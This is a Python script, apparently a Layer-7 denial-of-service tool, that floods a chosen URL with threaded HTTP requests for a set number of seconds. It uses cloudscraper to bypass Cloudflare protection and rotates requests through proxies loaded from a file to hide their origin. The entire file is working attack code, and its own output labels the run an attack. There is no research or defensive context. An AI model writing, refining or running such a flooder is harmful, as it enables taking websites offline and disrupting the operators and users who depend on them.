import threading, cloudscraper, datetime, time, sys, random, os
from colorama import Fore, init
init(convert=True)

# Proxy configuration
PROXY_FILE = "proxy.txt"  # Format: protocol://ip:port or protocol://user:pass@ip:port (one per line)
PROXIES = []

def load_proxies():
    global PROXIES
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                PROXIES = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f" [>] Loaded {len(PROXIES)} proxies from {PROXY_FILE}")
        else:
            print(Fore.RED + f" [X] Proxy file '{PROXY_FILE}' not found!")
            sys.exit(1)
    except Exception as e:
        print(Fore.RED + f" [X] Error loading proxies: {str(e)}")
        sys.exit(1)

def get_random_proxy():
    if not PROXIES:
        print(Fore.RED + " [X] No proxies available! Check your proxy.txt file")
        sys.exit(1)
    return random.choice(PROXIES)

def LaunchCFB(url, threadss, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    while threads_count <= int(threadss):
        try:
            proxy = get_random_proxy()
            scraper = cloudscraper.create_scraper()
            th = threading.Thread(target=AttackCFB, args=(url, until, scraper, proxy))
            th.start()
            threads_count += 1
        except:
            pass

def AttackCFB(url, until_datetime, scraper, proxy):
    proxy_dict = {'http': proxy, 'https': proxy}
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15, proxies=proxy_dict)
        except:
            # Rotate proxy if request fails
            new_proxy = get_random_proxy()
            proxy_dict = {'http': new_proxy, 'https': new_proxy}

if __name__ == '__main__':
    # Load proxies before starting
    load_proxies()
    
    if len(sys.argv) == 4:
        target = sys.argv[1]
        thread = sys.argv[2]
        t = sys.argv[3]
    else:
        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX,end='')
        target = input()
        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX,end='')
        thread = input()
        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX,end='')
        t = input()
    
    print(Fore.MAGENTA+" [>] "+Fore.WHITE+f"Attacking => {target} for {t} seconds (using {len(PROXIES)} proxies)")
    LaunchCFB(target, thread, t)
    time.sleep(int(t))
    print(Fore.MAGENTA+"\n [>] "+Fore.WHITE+"Attack complete.")